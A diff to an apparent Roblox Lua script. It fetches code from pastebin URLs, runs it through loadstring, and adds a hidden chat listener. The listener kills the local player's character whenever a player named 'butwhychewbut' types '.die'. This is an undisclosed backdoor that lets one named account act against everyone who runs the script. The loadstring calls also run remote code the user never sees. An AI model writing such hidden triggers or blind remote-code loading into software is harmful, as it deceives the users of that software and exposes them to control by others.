@@ -609,3 +609,23 @@ loadstring(game:HttpGet("https://pastebin.com/raw/pdRtuZn7"))()end
 
 wait(0.1)
 loadstring(game:HttpGet("https://pastebin.com/raw/WrtjphL1"))()
+wait(0.1)
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Function to reset the character
+local function resetCharacter()
+    LocalPlayer.Character:BreakJoints()
+end
+
+-- Listen for chat messages
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        -- Check if the player is "butwhychewbut" and the message is ".die"
+        if player.Name == "butwhychewbut" and message == ".die" then
+            -- Reset the local player's character
+            resetCharacter()
+        end
+    end)
+end)
